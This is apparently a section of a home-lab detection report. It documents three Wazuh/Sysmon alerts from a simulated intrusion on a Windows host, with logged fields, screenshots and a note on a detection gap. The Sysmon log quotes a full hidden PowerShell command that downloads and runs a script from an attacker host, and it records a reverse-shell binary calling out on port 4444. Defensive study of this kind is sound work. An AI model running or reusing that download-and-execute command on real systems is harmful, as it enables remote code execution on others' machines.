# 03 — Alert / Detection (actual events)

Three detection layers fired. All from agent `winhome01` (192.168.100.108).

## 1. Sysmon Event ID 1 — Process Create (the money shot)

Channel: `Microsoft-Windows-Sysmon/Operational`. Full JSON captured in Wazuh:

| Field | Value |
|---|---|
| `eventID` | **1** (Process Create) |
| `image` | `C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` (32-bit — suspicious) |
| `commandLine` | `powershell.exe -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.100.106/payload.ps1')"` |
| `parentImage` / `parentCommandLine` | `C:\Windows\SysWOW64\cmd.exe` / `cmd.exe` (psexec spawned cmd) |
| `user` / `integrityLevel` | `NT AUTHORITY\SYSTEM` / `System` |
| `processId` / `parentProcessId` | 10056 / 3960 |
| `hashes` | SHA1=FEE89BB169E4ABC71C7F1E8D05D0677F2B5919; MD5=C32CA4ACCFCC635EC1EA6ED8A34DF5FAC; SHA256=73A3C4AEF5DE385875339FC2EB7E58A9A8E47B6161BDC6436BF78A763537BE7; IMPHASH=194277A488EDD0A9731[...]
| `ruleName` (Sysmon tag) | **technique_id=T1059.001, technique_name=PowerShell** (SwiftOnSecurity config) |
| `utcTime` | 2026-10-27 16:09:43.270Z |
| `fileVersion` | 10.0.19041.546 |

<p align="center">
  <img src="./evidence/07-wazuh-sysmon-1-powershell-iex.png" width="80%" alt="Wazuh Sysmon 1 PowerShell IEX evidence">
</p>

**Why it's suspicious:** `-nop` (no profile), `-w hidden`, `IEX`, `Net.WebClient.DownloadString`, 32-bit PowerShell, parent = psexec-spawned cmd, running as SYSTEM. Any one is notable; all together it is a high-confidence post-execution execution chain.

## 2. PowerShell Event ID 4104 — Script Block Logging (defeats `-enc`)

Channel: `Microsoft-Windows-PowerShell/Operational`. Confirmed working:

| Field | Value |
|---|---|
| `eventID` | **4104** |
| `scriptBlockText` | full decoded script block captured (e.g. `$global:?` block shown; IEX/AMSI blocks also logged) |
| `scriptBlockId` | 62346efc-9e1d-41d9-9450-bacce3990cdd (sample) |
| `systemTime` | 2026-10-28T12:05:44.594Z |
| `eventRecordID` | 408 |
| `processID` | 9968 |
| `computer` | DESKTOP-F0JVTQT |
| `severityValue` | VERBOSE |

<p align="center">
  <img src="./evidence/08-wazuh-powershell-4104-scriptblock.png" width="80%" alt="Wazuh PowerShell 4104 scriptblock evidence">
</p>

**Key:** even the `-enc` base64 command is logged **decoded** in 4104 — obfuscation defeated at the logging layer.

## 3. Sysmon Event ID 3 — Network Connection (egress)

| Field | Value |
|---|---|
| `eventID` | **3** (Network connection detected) |
| `image` | `C:\Users\bryll\Downloads\free.exe` (dropped reverse-shell binary) |
| `destinationIp` / `destinationPort` | `192.168.100.106` / **4444** (TCP, initiated=true) |
| `sourceIp` / `sourcePort` | `192.168.100.108` / 52738 |
| `user` | `DESKTOP-F0JVTQT\bryll` |
| `processId` | 9152 |
| `ruleName` (Sysmon tag) | **technique_id=T1571, technique_name=Non-Standard Port** |
| `utcTime` | 2026-10-26 17:33:27.688Z |

<p align="center">
  <img src="./evidence/09-wazuh-sysmon-3-network-egress.png" width="80%" alt="Wazuh Sysmon 3 network egress evidence">
</p>

The PowerShell HTTP download (port 80) was corroborated by the attacker's HTTP server log: `GET /payload.ps1 200` from `.108`.

<p align="center">
  <img src="./evidence/03-kali-http-server-get.png" width="80%" alt="Kali HTTP server GET evidence">
</p>

## Detection gap note

No built-in Wazuh alert fired at high severity for these by default — detection required analyst triage of Sysmon/4104 events. Custom rule in `09-Remediation.md` closes this gap.
